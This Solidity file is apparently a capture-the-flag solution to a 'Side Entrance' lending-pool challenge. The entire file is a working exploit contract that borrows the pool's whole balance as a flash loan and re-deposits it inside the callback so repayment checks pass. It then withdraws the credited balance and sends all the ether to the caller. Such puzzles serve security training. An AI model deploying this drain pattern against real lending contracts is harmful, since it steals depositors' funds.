pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
  function deposit() external payable;
  function withdraw() external;
  function flashLoan(uint256 amount) external;
}

contract SideEntranceStealer {
  using Address for address payable;

  ISideEntranceLenderPool pool;
  uint amt;

  constructor(ISideEntranceLenderPool _pool) {
    pool = _pool;
  }

  function attackForMe() external {
    amt=address(pool).balance;
    pool.flashLoan(amt);
    pool.withdraw();
    payable(msg.sender).sendValue(address(this).balance);
  }

  function execute() external payable {
    pool.deposit{value: amt}();
  }

  receive() external payable {}
}